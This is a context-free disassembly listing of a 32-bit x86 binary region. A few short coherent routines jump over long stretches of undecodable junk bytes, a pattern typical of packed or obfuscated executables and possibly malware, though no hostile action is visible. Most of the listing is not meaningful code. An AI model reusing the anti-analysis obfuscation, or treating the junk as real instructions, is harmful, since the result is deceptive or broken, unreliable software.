  40f0ef:	loope  0x40f0a7
  40f0f1:	cmp    ebx,esp
  40f0f3:	in     al,0x7
  40f0f5:	(bad)
  40f0f8:	das    
  40f0f9:	or     ch,BYTE PTR [esi+0x5c5b939]
  40f0ff:	push   esi
  40f100:	test   eax,0x46598c84
  40f105:	gs fwait
  40f107:	adc    dh,BYTE PTR [ecx]
  40f109:	int3   
  40f10a:	arpl   WORD PTR [ecx+0x5ee78ed5],cx
  40f110:	pop    ebx
  40f111:	jp     0x40f094
  40f113:	shr    BYTE PTR [edx-0x4c],cl
  40f116:	fs jecxz 0x40f0f5
  40f119:	bound  edx,QWORD PTR [ecx+0x71cc7943]
  40f11f:	daa    
  40f120:	icebp  
  40f121:	and    edi,DWORD PTR [ebp+0x21]
  40f124:	psrlw  mm3,QWORD PTR [ebp-0x1a]
  40f128:	clc    
  40f129:	or     esp,DWORD PTR [esi+0x227e2120]
  40f12f:	(bad)  
  40f130:	aaa    
  40f131:	lods   al,BYTE PTR ds:[esi]
  40f132:	sbb    al,0xd5
  40f134:	push   esi
  40f135:	jl     0x40f105
  40f137:	adc    DWORD PTR ss:[edx+ecx*2-0x49aeb0b0],0xee63ec46
  40f143:	sbb    eax,0x3bd3d4d8
  40f148:	rcr    edx,1
  40f14a:	mov    cl,0x79
  40f14c:	scas   al,BYTE PTR es:[edi]
  40f14d:	(bad)  
  40f14e:	idiv   DWORD PTR [ebx]
  40f150:	push   0x5a
  40f152:	mov    ch,0xf
  40f154:	test   BYTE PTR [eax+0x1],bh
  40f157:	add    BYTE PTR [eax],al
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   eax,esp
  40f16e:	aaa    
  40f16f:	ins    BYTE PTR es:[edi],dx
  40f170:	pop    esi
  40f171:	mov    ds:0xc37070aa,eax
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f137
  40f17a:	mov    WORD PTR [ebx+0x582caad8],ss
  40f180:	or     ah,BYTE PTR [ecx-0x17]
  40f183:	adc    BYTE PTR [edx-0x1d78ba08],al
  40f189:	ja     0x40f1ec
  40f18b:	pop    ecx
  40f18c:	push   cs
  40f18d:	cmc    
  40f18e:	(bad)  
  40f18f:	mov    cl,0xce
  40f191:	adc    al,0x22
  40f193:	es inc ecx
  40f195:	cmc    
  40f196:	bound  esp,QWORD PTR [edi-0x68b78156]
  40f19c:	mov    bh,0x28
  40f19e:	cld    
  40f19f:	adc    ebp,DWORD PTR [edx+0x1dd9a8a6]
  40f1a5:	push   esp
  40f1a6:	push   0xe8f3e2da
  40f1ab:	int3   
  40f1ac:	(bad)  
  40f1ad:	ins    DWORD PTR es:[edi],dx
  40f1ae:	cmp    ah,BYTE PTR [edi-0x40fd105]
  40f1b4:	jnp    0x40f205
  40f1b6:	xor    bh,cl
  40f1b8:	adc    eax,0xf0ecae70
  40f1bd:	push   es
  40f1be:	sbb    DWORD PTR [ecx],0x44ac7e5
  40f1c4:	push   ds
  40f1c5:	rcr    DWORD PTR [edx-0x538f86c2],1
  40f1cb:	adc    dl,BYTE PTR [eax]
  40f1cd:	popa   
  40f1ce:	div    BYTE PTR [ecx-0x74e6cc05]
  40f1d4:	ret    0x561b
  40f1d7:	push   esi
  40f1d8:	jmp    0x51b32309
  40f1dd:	ss lahf 
  40f1df:	ins    BYTE PTR es:[edi],dx
  40f1e0:	je     0x40f240
  40f1e2:	popf   
  40f1e3:	sub    eax,0x31be9243
  40f1e8:	inc    edx
  40f1e9:	mov    eax,0x192e1efc
  40f1ee:	fidiv  DWORD PTR [ecx-0x10b6a450]
  40f1f4:	cli    
  40f1f5:	ins    BYTE PTR es:[edi],dx
  40f1f6:	sbb    eax,0x6b81bcbc
  40f1fb:	adc    al,bl
  40f1fd:	or     BYTE PTR [ebx],dh
  40f1ff:	sub    ah,BYTE PTR [ecx]
  40f201:	cmp    DWORD PTR [esi],ebp
  40f203:	xor    al,0x3a
  40f205:	pop    edi
  40f206:	pop    eax
  40f207:	adc    esp,esp
  40f209:	jnp    0x40f26d
  40f20b:	(bad)
  40f20e:	(bad)  
  40f20f:	adc    DWORD PTR [edi+0x55],esi
  40f212:	es imul cl
  40f215:	cwde   
  40f216:	ret    0x7349
  40f219:	add    DWORD PTR [ebx-0x17],ebx
  40f21c:	and    eax,ebp
  40f21e:	mov    eax,ds:0x6d9e75f9
  40f223:	and    eax,0x8b2d5db9
  40f228:	and    ah,ch
  40f22a:	dec    edx
  40f22b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f22c:	adc    BYTE PTR [edx+0x395361e7],dh
  40f232:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f233:	lods   al,BYTE PTR ds:[esi]
  40f234:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f235:	sub    DWORD PTR gs:0xebdd6301,0x4d502a41
  40f240:	xor    DWORD PTR ds:0x15509348,edi
  40f246:	sub    esp,edi
  40f248:	sub    al,0xf2
  40f24a:	retf   0x1ec
  40f24d:	lods   al,BYTE PTR ds:[esi]
  40f24e:	repz retf 
  40f250:	mov    WORD PTR [ebp-0x14],es
  40f253:	mov    ?,WORD PTR [esi+0x18]
  40f256:	rcl    DWORD PTR [esi-0x3a],0x62
  40f25a:	inc    ecx
  40f25b:	aad    0x90
  40f25d:	xchg   ebx,eax
  40f25e:	(bad)  
  40f25f:	mov    edi,0x619f1cb4
  40f264:	mov    al,ds:0x7a9d2b50
  40f269:	fistp  DWORD PTR [edx]
  40f26b:	adc    eax,0xc94c0d6b
  40f270:	leave  
  40f271:	pop    esp
  40f272:	not    DWORD PTR [eax+0x61]
  40f275:	cmp    BYTE PTR [ecx],bh
  40f277:	loope  0x40f247
  40f279:	xor    DWORD PTR [esi-0xa],esp
  40f27c:	dec    ebp
  40f27d:	out    dx,al
  40f27e:	in     eax,dx
  40f27f:	push   edi
  40f280:	dec    ebp
  40f281:	pavgb  mm3,mm1
  40f284:	mov    edx,0x3b144dc8
  40f289:	test   DWORD PTR [bp-0xbf1],edi
  40f28e:	aaa    
  40f28f:	call   0x40c80bb3
  40f294:	in     eax,0xc7
  40f296:	push   edx
  40f297:	push   edx
  40f298:	mov    ds:0x538ae28a,eax
  40f29d:	pop    ebx
  40f29e:	cmp    al,ch
  40f2a0:	scas   eax,DWORD PTR es:[edi]
  40f2a1:	ins    BYTE PTR es:[edi],dx
  40f2a2:	cdq    
  40f2a3:	push   ds
  40f2a4:	sbb    al,0x53
  40f2a6:	xor    dh,bh
  40f2a8:	fsubr  st,st(1)
  40f2aa:	push   ecx
  40f2ab:	inc    ebp
  40f2ac:	loope  0x40f2b3
  40f2ae:	pop    edi
  40f2af:	cmp    al,0x79
  40f2b1:	sbb    ecx,DWORD PTR [esi]
  40f2b3:	aam    0x4
  40f2b5:	xor    ebp,DWORD PTR [edx+0x19ee6d77]
  40f2bb:	sub    dh,BYTE PTR [esi]
  40f2bd:	nop
  40f2be:	push   esi
  40f2bf:	ds ds jmp 0x23dabbb9
  40f2c6:	mov    DWORD PTR [eax],0x60341e89
  40f2cc:	jmp    0x40f7b6
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	ror    ah,1
  40f2f8:	stc    
  40f2f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2fa:	jge    0x40f372
  40f2fc:	test   eax,0x7fc37070
  40f301:	jo     0x40f373
  40f303:	(bad)  
  40f304:	jmp    0x3aba:0x11781ff1
  40f30b:	repnz rcr DWORD PTR [edx],0x77
  40f30f:	push   edx
  40f310:	lods   eax,DWORD PTR ds:[esi]
  40f311:	jg     0x40f357
  40f313:	cli    
  40f314:	leave  
  40f315:	int3   
  40f316:	xchg   esi,eax
  40f317:	cmp    DWORD PTR [edi+0x623e410f],0xe3b79b5d
  40f321:	and    ecx,ecx
  40f323:	imul   esi,DWORD PTR es:[edx-0x5e],0x53
  40f328:	jmp    0x1f2:0xc23a317d
  40f32f:	pop    eax
  40f330:	(bad)  
  40f331:	iret   
  40f332:	and    eax,0x4496099a
  40f337:	sbb    al,0x99
  40f339:	aas    
  40f33a:	cmp    eax,0x7fec236d
  40f33f:	sbb    DWORD PTR [esi+0x1c52c798],edx
  40f345:	pop    ss
  40f346:	inc    ebp
  40f347:	aaa    
  40f348:	outs   dx,BYTE PTR ds:[esi]
  40f349:	out    dx,eax
  40f34a:	cmp    ah,bh
  40f34c:	inc    ebx
  40f34d:	xor    BYTE PTR [esi+0x6b49f754],al
  40f353:	sub    BYTE PTR [ebp-0x4b],0x16
  40f357:	mov    esp,0x870927ba
  40f35c:	xor    BYTE PTR [esp+ecx*4-0x6fe836db],dh
  40f363:	cmp    DWORD PTR [esi+0x6463dbd1],0xae67f114
  40f36d:	pop    edx
  40f36e:	sbb    ecx,DWORD PTR ds:0x3526bea5
  40f374:	and    edi,DWORD PTR [eax+0x79c65c87]
  40f37a:	(bad)  
  40f37b:	(bad)  
  40f37d:	mov    ecx,0x95124e07
  40f382:	xor    eax,DWORD PTR [esi-0x4f]
  40f385:	mov    eax,ds:0x217ea8be
  40f38a:	icebp  
  40f38b:	cmp    BYTE PTR [ecx],bl
  40f38d:	dec    esi
  40f38e:	scas   al,BYTE PTR es:[edi]
  40f38f:	push   ss
  40f390:	inc    ecx
  40f391:	ror    BYTE PTR [ecx+0x75ee4632],cl
  40f397:	ds popf 
  40f399:	ins    DWORD PTR es:[edi],dx
  40f39a:	popf   
  40f39b:	enter  0x1638,0x5e
  40f39f:	les    eax,FWORD PTR [ecx-0x1f]
  40f3a2:	rcl    BYTE PTR [esi],0x8
  40f3a5:	nop
  40f3a6:	rcr    BYTE PTR [eax+0x596631c3],1
  40f3ac:	sub    BYTE PTR [ecx-0x6d],ah
  40f3af:	cmp    DWORD PTR [eax],edi
  40f3b1:	les    esi,FWORD PTR cs:[ecx+0x380d6584]
  40f3b8:	call   0x2f5e494
  40f3bd:	dec    ebp
  40f3be:	enter  0x4bcf,0x86
  40f3c2:	sub    DWORD PTR [esp+ebx*8],ecx
  40f3c5:	mov    ebp,0x70411385
  40f3ca:	mov    esp,DWORD PTR [esi]
  40f3cc:	jg     0x40f389
  40f3ce:	lods   eax,DWORD PTR ds:[esi]
  40f3cf:	pop    esi
  40f3d0:	pop    eax
  40f3d1:	and    edi,DWORD PTR [esi-0x6e2cad0a]
  40f3d7:	pop    eax
  40f3d8:	mov    ebp,ebx
  40f3da:	out    0x7d,eax
  40f3dc:	fst    QWORD PTR [esi+0x73]
  40f3df:	sar    DWORD PTR [esi+edx*2-0x3a95db88],cl
  40f3e6:	sbb    eax,DWORD PTR [edx-0x4c]
  40f3e9:	les    ecx,FWORD PTR [edx+0x1867d157]
  40f3ef:	or     eax,0xbc0bf018
  40f3f4:	adc    dh,BYTE PTR [edi-0x1d]
  40f3f7:	sti    
  40f3f8:	(bad)  
  40f3f9:	imul   BYTE PTR [eax]
  40f3fb:	jle    0x40f3a6
  40f3fd:	mov    dl,0x5e
  40f3ff:	(bad)  
  40f400:	push   DWORD PTR [edi]
  40f402:	addr16 sbb al,0x30
  40f405:	shr    BYTE PTR [ebx+0x2],0x46
  40f409:	retf   
  40f40a:	fcos   
  40f40c:	lsl    ebp,di
  40f40f:	mov    ds:0x8fe34cb9,al
  40f414:	(bad)  
  40f415:	mov    ebx,0xce350960
  40f41a:	mov    bl,0x6d
  40f41c:	dec    edx
  40f41d:	adc    BYTE PTR [ebx-0x55],ch
  40f420:	leave  
  40f421:	inc    ebp
  40f422:	xor    DWORD PTR [ebp*8+0x55993291],0x18d84d35
  40f42d:	in     eax,0xbe
  40f42f:	sbb    ah,BYTE PTR [ebp+0x7e655b53]
  40f435:	and    ch,dh
  40f437:	mov    esi,0x45b4265e
  40f43c:	lahf   
  40f43d:	xor    al,al
  40f43f:	sub    eax,0xd483e30b
  40f444:	call   DWORD PTR [esi]
  40f446:	leave  
  40f447:	adc    DWORD PTR [ebx+0x249cc3db],ebx
  40f44d:	push   ebp
  40f44e:	retf   0x8bd9
  40f451:	inc    ebp
  40f452:	clc    
  40f453:	jmp    0x40f5bd
  40f458:	inc    eax
  40f459:	gs ror ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	sar    DWORD PTR [eax-0x71],0xaf
  40f468:	cmp    DWORD PTR [edi+0x7fc37070],esi
  40f46e:	jo     0x40f4e0
  40f470:	mov    edx,0xc6246456
  40f475:	mov    ebx,0x4e837410
  40f47a:	stos   DWORD PTR es:[edi],eax
  40f47b:	xor    DWORD PTR [ecx],esi
  40f47d:	xlat   BYTE PTR ds:[ebx]
  40f47e:	ja     0x40f47d
  40f480:	popf   
  40f481:	cld    
  40f482:	jge    0x40f465
  40f484:	pop    es
  40f485:	mov    ebx,0xd2ff538c
  40f48a:	or     edi,DWORD PTR [esp+eax*4]
  40f48d:	xchg   BYTE PTR [ebp+0x59ab6ca1],bl
  40f493:	out    dx,eax
  40f494:	or     ebx,DWORD PTR ds:0xab01380a
  40f49a:	pusha  
  40f49b:	in     eax,dx
  40f49c:	adc    edi,edi
  40f49e:	jge    0x40f4af
  40f4a0:	jle    0x40f4a7
  40f4a2:	in     eax,0xe3
  40f4a4:	mov    ebp,DWORD PTR [edi+0x5cd7dd31]
  40f4aa:	push   es
  40f4ab:	(bad)  [ebp-0x1]
  40f4ae:	inc    esi
  40f4af:	cmp    BYTE PTR [esi-0x7b],bl
  40f4b2:	or     eax,DWORD PTR [esi]
  40f4b4:	out    0x40,eax
  40f4b6:	push   0x6af709b1
  40f4bb:	sbb    BYTE PTR [edi-0x37fc626c],dh
  40f4c1:	sbb    bl,BYTE PTR [ebx]
  40f4c3:	lods   eax,DWORD PTR ds:[esi]
  40f4c4:	rcl    ecx,0x32
  40f4c7:	aad    0x3
  40f4c9:	shl    dl,cl
  40f4cb:	cmp    bh,bh
  40f4cd:	mov    ebx,0x1b0d10ad
  40f4d2:	inc    edx
  40f4d3:	in     al,0x60
  40f4d5:	shl    DWORD PTR [ecx],1
  40f4d7:	push   cs
  40f4d8:	(bad)  
  40f4d9:	dec    esi
  40f4da:	pop    ds
  40f4db:	push   edx
  40f4dc:	pop    ebx
  40f4dd:	jnp    0x40f484
  40f4df:	ins    DWORD PTR es:[edi],dx
  40f4e0:	add    ah,ah
  40f4e2:	leave  
  40f4e3:	push   es
  40f4e4:	shl    BYTE PTR [edi+edi*1-0x7e],cl
  40f4e8:	sub    dh,BYTE PTR [eax-0x11a0b245]
  40f4ee:	(bad)  
  40f4ef:	mov    ds:0x7148976e,al
  40f4f4:	sti    
  40f4f5:	xor    ebp,ebp
  40f4f7:	cli    
  40f4f8:	mov    al,0x75
  40f4fa:	jb     0x40f4c4
  40f4fc:	loopne 0x40f56c
  40f4fe:	push   eax
  40f4ff:	cmp    eax,0x1f3fb7dc
  40f504:	adc    esp,DWORD PTR [edx-0x44]
  40f507:	jbe    0x40f4f1
  40f509:	lock add DWORD PTR [edi-0x61],0x19
  40f50e:	jmp    0x57b3:0x335ef7ff
  40f515:	cwde   
  40f516:	and    al,BYTE PTR [edx-0x27]
  40f519:	ins    DWORD PTR es:[edi],dx
  40f51a:	inc    edi
  40f51b:	mov    edx,0x771cf3ca
  40f520:	inc    edi
  40f521:	les    esi,FWORD PTR ds:0x30cd09a4
  40f527:	add    DWORD PTR [eax+0x8],ebp
  40f52a:	aas    
  40f52b:	or     eax,0xe1d198b1
  40f530:	or     BYTE PTR [esi+ebx*4-0x7a0cbfd3],dh
  40f537:	(bad)  
  40f538:	mov    ebp,0xc98cf085
  40f53d:	fcom   DWORD PTR [eax-0x34]
  40f540:	xor    BYTE PTR [edi],ah
  40f542:	mov    edx,0x48fc2530
  40f547:	inc    esi
  40f548:	aad    0x9c
  40f54a:	sub    al,0x33
  40f54c:	(bad)  
  40f54e:	fs ret 0x73c2
  40f552:	cli    
  40f553:	adc    BYTE PTR [esi],al
  40f555:	dec    esp
  40f556:	dec    esp
  40f557:	mov    cs,WORD PTR [esi+esi*2-0x6453318a]
  40f55e:	xchg   esp,eax
  40f55f:	icebp  
  40f560:	jo     0x40f599
  40f562:	xor    dl,BYTE PTR [edi-0x3f]
  40f565:	ffree  st(6)
  40f567:	cmp    al,0x7e
  40f569:	mov    ecx,0x83eea0e9
  40f56e:	hlt    
  40f56f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f570:	test   eax,0xecaa7c75
  40f575:	icebp  
  40f576:	push   0xd6c6c162
  40f57b:	inc    eax
  40f57c:	push   0x5f
  40f57e:	lds    ebp,FWORD PTR [ebp-0x38]
  40f581:	mov    bh,0x83
  40f583:	rcr    BYTE PTR [eax],0x76
  40f586:	sub    al,0x7b
  40f588:	jle    0x40f5bd
  40f58a:	and    DWORD PTR [eax+0x7f],0xa3460df8
  40f591:	push   eax
  40f592:	fstp   TBYTE PTR [esi-0x55047811]
  40f598:	jnp    0x40f5fc
  40f59a:	popf   
  40f59b:	xchg   edi,eax
  40f59c:	pushf  
  40f59d:	cmp    eax,0x5530f6db
  40f5a2:	mov    BYTE PTR [eax],bl
  40f5a4:	lahf   
  40f5a5:	inc    ebp
  40f5a6:	sbb    eax,DWORD PTR [edx-0x12]
  40f5a9:	mov    cl,0x8d
  40f5ab:	pusha  
  40f5ac:	jecxz  0x40f5e0
  40f5ae:	sbb    eax,0xc7d6004a
  40f5b3:	ret    0xd324
  40f5b6:	push   ebp
  40f5b7:	shl    DWORD PTR [edi+eiz*1+0x1],0x70
  40f5bc:	fisttp DWORD PTR [ebx+0x3c408b00]
  40f5c2:	lea    ecx,[ecx*8+0x78]
  40f5c9:	add    eax,ecx
  40f5cb:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5ce:	mov    ecx,DWORD PTR [ecx]
  40f5d0:	mov    eax,DWORD PTR [eax+ecx*1]
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	shl    BYTE PTR [esi+esi*2+0x70b68c51],1
  40f60a:	jo     0x40f5cf
  40f60c:	jg     0x40f67e
  40f60e:	jo     0x40f62e
  40f610:	fdivrp st(5),st
  40f612:	test   eax,0xd05d0451
  40f617:	dec    eax
  40f618:	jmp    0xf9f2:0x4db89f0b
  40f61f:	adc    eax,0x5b90497
  40f624:	rcr    dl,0x41
  40f627:	jbe    0x40f5c1
  40f629:	add    BYTE PTR [eax],0x60
  40f62c:	bound  eax,QWORD PTR [eax]
  40f62e:	sbb    DWORD PTR [edi-0x79],esp
  40f631:	in     eax,0x9
  40f633:	es inc ecx
  40f635:	(bad)  
  40f636:	mov    DWORD PTR [ecx],eax
  40f638:	add    eax,0x19ce1192
  40f63d:	pop    edi
  40f63e:	push   esi
  40f63f:	cmp    al,0x34
  40f641:	or     ebp,DWORD PTR [ecx+0x76]
  40f644:	inc    ebx
  40f645:	mov    ds:0xd36f2915,al
  40f64a:	pop    ebp
  40f64b:	push   ebx
  40f64c:	loopne 0x40f630
  40f64e:	popf   
  40f64f:	mov    edi,0x623becac
  40f654:	mov    esi,0x88b8909e
  40f659:	inc    edi
  40f65a:	and    dl,BYTE PTR ds:0xaece73ff
  40f660:	sub    al,0x7f
  40f662:	imul   ebp,esi,0x31134b89
  40f668:	push   ds
  40f669:	loop   0x40f6ca
  40f66b:	cmp    eax,0x23744f8
  40f670:	sub    esi,DWORD PTR [esi-0x54ba1b16]
  40f676:	mov    ebx,0x9d26024c
  40f67b:	or     esp,eax
  40f67d:	and    eax,0x52d0a718
  40f682:	leave  
  40f683:	sub    ch,BYTE PTR [ebx-0xe]
  40f686:	or     eax,0x96cf32ac
  40f68b:	pusha  
  40f68c:	push   0xffffff81
  40f68e:	push   es
  40f68f:	mov    ds:0x6f551ded,eax
  40f694:	cmp    DWORD PTR [eax+0x55],edx
  40f697:	cmp    DWORD PTR [eax+ebp*8],esi
  40f69a:	aad    0xab
  40f69c:	rcl    dh,0xc1
  40f69f:	mov    bh,0xaa
  40f6a1:	(bad)  
  40f6a2:	lea    ecx,[esi-0x27f0dd05]
  40f6a8:	int3   
  40f6a9:	pop    esi
  40f6aa:	and    BYTE PTR [edi],bh
  40f6ac:	test   eax,0xee27279c
  40f6b1:	adc    BYTE PTR ds:0xe02dae4d,dl
  40f6b7:	fimul  DWORD PTR [ecx+0x4c38b1f9]
  40f6bd:	arpl   WORD PTR [edx],bp
  40f6bf:	mov    eax,ds:0xd30873ae
  40f6c4:	sub    dh,BYTE PTR [edx]
  40f6c6:	pushf  
  40f6c7:	cdq    
  40f6c8:	scas   al,BYTE PTR es:[edi]
  40f6c9:	bound  edx,QWORD PTR [edi]
  40f6cb:	dec    ebp
  40f6cc:	call   0x90539ca0
  40f6d1:	fptan  
  40f6d3:	call   0xefbd:0xe6d11cfc
  40f6da:	sub    bl,BYTE PTR [esi-0x1bbbc199]
  40f6e0:	mov    edi,0x6af3266d
  40f6e5:	in     al,dx
  40f6e6:	(bad)  
  40f6e7:	cmp    bh,ch
  40f6e9:	mov    ds:0xa6a8693b,al
  40f6ee:	adc    eax,0x532d89b0
  40f6f3:	int3   
  40f6f4:	(bad)  
  40f6f5:	rol    BYTE PTR [edx+0x48],1
  40f6f8:	and    BYTE PTR [edi-0x6ca21ea6],0xd3
  40f6ff:	leave  
  40f700:	out    dx,al
  40f701:	pop    edx
  40f702:	jg     0x40f69f
  40f704:	fdiv   DWORD PTR [ebp-0x19]
  40f707:	in     al,dx
  40f708:	ds adc al,0x9d
  40f70b:	add    BYTE PTR [edx+eiz*8],0xc2
  40f70f:	push   ss
  40f710:	xchg   ebp,eax
  40f711:	fldenv [ebx-0x3f]
  40f714:	push   ds
  40f715:	mul    DWORD PTR [eax+0x4b]
  40f718:	push   es
  40f719:	or     al,0x35
  40f71b:	cdq    
  40f71c:	out    0xa9,al
  40f71e:	mov    edx,DWORD PTR [ecx-0x3d]
  40f721:	cmp    dh,BYTE PTR [ecx-0x160e6e01]
  40f727:	cs jne 0x40f718
  40f72a:	hlt    
  40f72b:	cli    
  40f72c:	mov    WORD PTR [ebx+0x42bc6579],gs
  40f732:	push   bx
  40f734:	hlt    
  40f735:	and    bl,ah
  40f737:	dec    ebp
  40f738:	xor    eax,ebp
  40f73a:	fdivr  DWORD PTR [eax-0x859c282]
  40f740:	xor    al,0x89
  40f742:	sbb    ah,BYTE PTR [edx]
  40f744:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f745:	shl    DWORD PTR [edi+esi*4+0x6e],1
  40f749:	rcr    di,cl
  40f74c:	mov    dl,0x99
  40f74e:	(bad)  
  40f74f:	iret   
  40f750:	std    
  40f751:	xor    eax,0x42b7247a
  40f756:	daa    
  40f757:	loop   0x40f7bd
  40f759:	mov    ds:0x458b70a4,eax
  40f75e:	clc    
  40f75f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f762:	add    ecx,DWORD PTR [eax]
  40f764:	mov    DWORD PTR [ebp-0x24],ecx
  40f767:	mov    eax,DWORD PTR [ebp-0x24]
  40f76a:	mov    ecx,DWORD PTR [ebp-0x8]
  40f76d:	mov    eax,DWORD PTR [eax+0xc]
  40f770:	mov    ecx,DWORD PTR [ecx]
  40f772:	mov    al,BYTE PTR [eax+ecx*1]
  40f775:	add    al,0x37
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0x16f146f3
  40f7e3:	sahf   
  40f7e4:	call   0x7da3:0x7070b55f
  40f7eb:	jo     0x40f85d
  40f7ed:	dec    esi
  40f7ee:	or     ch,BYTE PTR [ebx-0xa3558e9]
  40f7f4:	(bad)  
  40f7f6:	test   DWORD PTR [ecx+0x3d],ebx
  40f7f9:	out    dx,eax
  40f7fa:	es push es
  40f7fc:	mov    bh,0x64
  40f7fe:	xchg   bp,ax
  40f800:	add    eax,0x2fd9cbd8
  40f805:	push   ebx
  40f806:	lods   al,BYTE PTR ds:[esi]
  40f807:	jne    0x40f7a6
  40f809:	xchg   ecx,eax
  40f80a:	inc    edi
  40f80b:	into   
  40f80c:	cmp    bh,BYTE PTR [ebp+0x3853497f]
  40f812:	into   
  40f813:	pop    edi
  40f814:	and    DWORD PTR [edi+esi*1+0x4c],esi
  40f818:	jb     0x40f863
  40f81a:	mov    BYTE PTR [edx],dl
  40f81c:	pop    ecx
  40f81d:	push   ss
  40f81e:	cdq    
  40f81f:	int    0xf1
  40f821:	jle    0x40f862
  40f823:	scas   eax,DWORD PTR es:[edi]
  40f824:	add    al,0x83
  40f826:	xchg   ecx,eax
  40f827:	mov    dh,0x27
  40f829:	test   eax,0xdff4f4ae
  40f82e:	mov    ds:0x3a6db8f0,al
  40f833:	lods   al,BYTE PTR ds:[esi]
  40f834:	(bad)  
  40f835:	mov    bh,0x47
  40f837:	cli    
  40f838:	cli    
  40f839:	jmp    0xb880def3
  40f83e:	adc    al,ah
  40f840:	imul   ecx,DWORD PTR [ebx+0x38],0x6e7486a2
  40f847:	sbb    esp,ebp
  40f849:	push   esp
  40f84a:	push   eax
  40f84b:	and    ebx,ebx
  40f84d:	jmp    0x5e239922
  40f852:	outs   dx,DWORD PTR ds:[esi]
  40f853:	cli    
  40f854:	mov    edx,0x8e5b5c70
  40f859:	sub    BYTE PTR [eax+eiz*1-0x13],0x17
  40f85e:	inc    esp
  40f85f:	sub    DWORD PTR [esi-0x62],esp
  40f862:	push   es
  40f863:	xchg   BYTE PTR [esi],al
  40f865:	or     edx,DWORD PTR [edi+0x392129b2]
  40f86b:	cld    
  40f86c:	retf   
  40f86d:	das    
  40f86e:	adc    DWORD PTR [edx],esi
  40f870:	inc    edx
  40f871:	les    esi,FWORD PTR [edi]
  40f873:	lock arpl WORD PTR [edx-0x5],bx
  40f877:	xchg   edi,eax
  40f878:	dec    ebp
  40f879:	mov    cl,0x9a
  40f87b:	mov    al,0xec
  40f87d:	xor    BYTE PTR [edi],dh
  40f87f:	aas    
  40f880:	popa   
  40f881:	pop    ecx
  40f882:	lahf   
  40f883:	pop    ebx
  40f884:	push   es
  40f885:	out    dx,eax
  40f886:	js     0x40f849
  40f888:	inc    edi
  40f889:	scas   al,BYTE PTR es:[edi]
  40f88a:	mov    ebp,0xa7c49c3b
  40f88f:	pop    ecx
  40f890:	push   esi
  40f891:	shr    DWORD PTR [edx],cl
  40f893:	inc    ebp
  40f894:	es push ecx
  40f896:	push   0xffffffcb
  40f898:	sbb    DWORD PTR [ecx-0x40a53c],esi
  40f89e:	lods   eax,DWORD PTR ds:[esi]
  40f89f:	dec    ebx
  40f8a0:	in     al,0xce
  40f8a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8a3:	dec    eax
  40f8a4:	mov    eax,ds:0xb80299e0
  40f8a9:	xchg   esi,eax
  40f8aa:	dec    edx
  40f8ab:	xchg   ebx,eax
